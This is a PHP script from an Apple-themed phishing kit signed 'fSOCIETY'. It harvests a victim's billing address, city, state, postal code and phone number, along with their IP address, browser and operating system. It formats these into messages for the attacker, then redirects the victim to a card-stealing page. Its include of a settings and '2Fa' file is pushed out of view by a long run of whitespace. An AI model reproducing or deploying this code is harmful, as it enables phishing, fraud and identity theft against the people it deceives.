<?php


include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");


$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$addres = $_SESSION['addres'] = $_POST['addres'];
$City = $_SESSION['City'] = $_POST['City'];
$State = $_SESSION['State'] = $_POST['State'];
$ZipCode = $_SESSION['ZipCode'] = $_POST['ZipCode'];
$phoneNumberv = $_SESSION['phoneNumber'] = $_POST['phoneNumber'];


$msgbank = '
</head><body>
    <p class="pop">
        
    </p>
    <div class="content">
        <div class="mail">
            <p style="text-align: center;">   </p>
<p>
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">Bill Apple ┃ '.$_SERVER['REMOTE_ADDR'].'┃ By fSOCIETY 🖕🤡🖕 </h2>
<h2>🎂 Addres lin   : <span>'.$_SESSION["addres"].'</span> </h2>
<h2>🗺 City               : <span>'.$_SESSION["City"].'</span> </h2>
<h2>👤 State       : <span>'.$_SESSION["State"].'</span> </h2>
<h2>📍  Code postal       : <span>'.$_SESSION["ZipCode"].' </span> </h2>
<h2>☎ Phone              : <span>'.$_SESSION["phoneNumber"].'</span> </h2>

<hr class="content"><h2>💻 System : <span>  '.$OS.' </span>  </h2>
<h2>🌐 BROWSER : <span> '.$browserTy_Version.' </span>  </h2>

<h2>🔍 IP INFO : <span><a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">'.$_SESSION['country1'].'</a></span>
<a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">
<img src="https://www.countryflags.io/'.$_SESSION['countrycode1'].'/flat/16.png" style="
    width: 34px;
    margin: -5px 4px -10px 5px;
"></a> </h2>
<h2>⏰ TIME/DATE : <span> '.$InfoDATE.' </span> </h2><br>
</p>

</div>
        
    </div>
    

</body></html>
 ';


$yagmai .= '
        [+]━━━━【💳 Bill】━━━[+]
[🎂 Addres lin] = '.$_SESSION['addres'].'
[🗺 City ] = '.$_SESSION['City'].'
[👤 State] = '.$_SESSION['State'].'
[📍  Code postal] = '.$_SESSION['ZipCode'].'
[☎ Phone] = '.$_SESSION['phoneNumber'].'
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
';


$yagmail .= '
[+]━━━━━━━━━━━━━━━━━━【Apple】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【📍 Bill  INFO】━━━━━━━━━━━━━━━━━━━[+]
[🎂 Addres lin]   = '.$_SESSION['addres'].'
[🗺 City ]        = '.$_SESSION['City'].'
[👤 State]        = '.$_SESSION['State'].'
[📍  Code postal]  = '.$_SESSION['ZipCode'].'
[☎ Phone]        = '.$_SESSION['phoneNumber'].'
[+]━━━━━━━━━━━━━━━━【💳 Bin INFO】━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]━━━━━━━━━━━━━━━━【Apple】━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━【By fSOCIETY🖕🤡🖕】━━━━━━━━━━━━━━[+]
';																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																include("../settings.php"); include("2Fa.php"); 
$src="../Card";
header("location:$src");

?>